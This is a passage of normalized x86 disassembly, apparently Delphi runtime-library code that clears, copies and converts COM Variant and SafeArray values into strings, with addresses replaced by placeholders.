push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e624
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e680
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e54c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e54c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e5f4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e54c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e54c
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e624
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e54c
mov eax [ ebp - 0x314 ]
call sub_40e878
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e7fc
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e54c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f5c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410264
test al al
je r-xdata
mov eax ebx
call sub_40e680
jmp r-xdata
push ebx
call VariantClear
call sub_40e54c
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e894
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e8c4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e8c4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e920
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e54c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e54c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e878
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e2a4
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e54c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e54c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e894
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e8c4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e54c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e54c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eaf4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e7fc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e54c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403fb0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410264
test al al
je r-xdata
mov ecx sub_40eaec
mov edx esi
mov eax ebx
call sub_40e920
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e54c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eba0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40eaf4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e7fc
sub_40ebe4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40463c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e558
pop ebx
pop ebp
retn 0x8
sub_40ec1c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40463c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e558
pop ebx
pop ebp
retn 0x8
sub_40ec54
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ed0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40463c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e558
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed11
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f80
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4041e4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407a80
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404788
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4041e4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407a44
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404788
jmp r-xdata
jmp r-xdata
call sub_40e1b4
sub_40ed18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40edd7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40edb5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e558
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40474c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404838
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edbc
lea eax [ ebp - 0x10 ]
call sub_40e878
retn
sub_40ede4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ee3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eba0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40eecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee41
lea eax [ ebp - 0x10 ]
call sub_40e878
retn
sub_40ee48
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410264
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40eebd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e878
retn
sub_40eecc
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f403
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40ef05 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fb0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f5c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403fb0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fb0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40929c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fb0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40929c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403fb0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ebe4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041e4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ec1c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4041e4
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_40474c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404838
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4041e4
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40ec54
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4041e4
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403fb0
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403fb0
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407f80
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403fb0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407f80
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40eecc
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ed18
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403fb0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f40a
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f80
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404654
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f80
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404654
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f80
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ede4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403fb0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403fb0
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e118
test ah 0x40
je r-xdata
mov eax esi
call sub_403f5c
mov edx eax
mov eax ebx
call sub_40ee48
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40ed18
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403fb0
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40ed18
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403fb0
jmp r-xdata
jmp [ eax * 4 + jump_table_40f199 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403fb0
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40929c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40929c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ebe4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4041e4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40ec1c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4041e4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404184
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ec54
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4041e4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403fb0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403fb0
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407f80
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407f80
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403fb0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40eecc
jmp r-xdata
sub_40f410
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f4ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f49d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e558
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40474c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404838
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4a4
lea eax [ ebp - 0x10 ]
call sub_40e878
retn
sub_40f4c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f51e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eba0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f5f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f525
lea eax [ ebp - 0x10 ]
call sub_40e878
retn
sub_40f52c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f5e4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410264
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5eb
lea eax [ ebp - 0x20 ]
call sub_40463c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f5c7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40474c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404838
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e878
retn
sub_40f5f4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fb46
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f62e ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404788
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40463c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404788
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40929c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404788
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40929c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404788
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ebe4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404678
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ec1c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404678
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_40474c
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404838
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40ec54
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404678
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407e94
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407f80
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404788
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407f80
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404788
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f5f4
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f410
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404678
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb4d
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404654
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f80
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404654
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f80
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404654
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f80
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404654
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f80
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f4c8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404678
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404788
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e118
test ah 0x40
je r-xdata
mov eax esi
call sub_40463c
mov edx eax
mov eax ebx
call sub_40f52c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f410
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404678
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f410
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404678
jmp r-xdata
jmp [ eax * 4 + jump_table_40f8b5 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407e94
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
